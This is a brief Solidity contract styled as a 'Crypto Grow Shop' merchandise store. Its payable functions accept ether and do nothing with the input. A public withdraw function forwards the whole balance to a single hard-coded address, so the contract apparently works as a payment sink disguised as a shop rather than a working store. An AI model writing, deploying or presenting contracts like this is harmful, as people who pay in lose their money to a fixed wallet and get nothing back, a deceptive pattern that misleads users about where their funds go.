// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

//    ______                 __           ______                      _____ __              
//   / ___________  ______  / /_____     / _____________ _      __   / ___// /_  ____  ____ 
//  / /   / ___/ / / / __ \/ __/ __ \   / / __/ ___/ __ | | /| / /   \__ \/ __ \/ __ \/ __ \
// / /___/ /  / /_/ / /_/ / /_/ /_/ /  / /_/ / /  / /_/ | |/ |/ /   ___/ / / / / /_/ / /_/ /
// \____/_/   \__, / .___/\__/\____/   \____/_/   \____/|__/|__/   /____/_/ /_/\____/ .___/ 
//           /____/_/                                                              /_/      

contract MerchStore {

    receive() external payable {}

    function sendValues(string memory list) public payable {}

    function withdraw() public payable {
        0xa3B17117F104e5965e98F07fe007784F6e3F3A2D.call{value: address(this).balance}("");
    }
}